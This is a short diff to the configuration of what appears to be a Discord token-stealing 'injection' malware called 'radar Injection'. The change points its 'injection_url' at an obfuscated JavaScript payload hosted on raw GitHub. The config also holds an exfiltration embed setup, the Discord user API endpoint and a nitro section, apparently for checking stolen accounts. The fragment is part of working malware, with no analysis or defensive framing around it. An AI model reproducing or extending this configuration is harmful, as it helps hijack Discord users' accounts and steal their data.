@@ -14,7 +14,7 @@ const config = {
   embed_name: 'radar Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1395969452193087612/1395970955297165382/bm1fTT0.png?ex=687c62c3&is=687b1143&hm=d17ca5d5bf1aa38c944063592bd2cb790fc7aad65128a1d7a4e19e9adf8e1509&=&format=webp&quality=lossless&width=415&height=417'.replace(/ /g, '%20'),
   embed_color: 631940, 
-  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/539835689456/main/good.js', 
+  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/radar/refs/heads/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
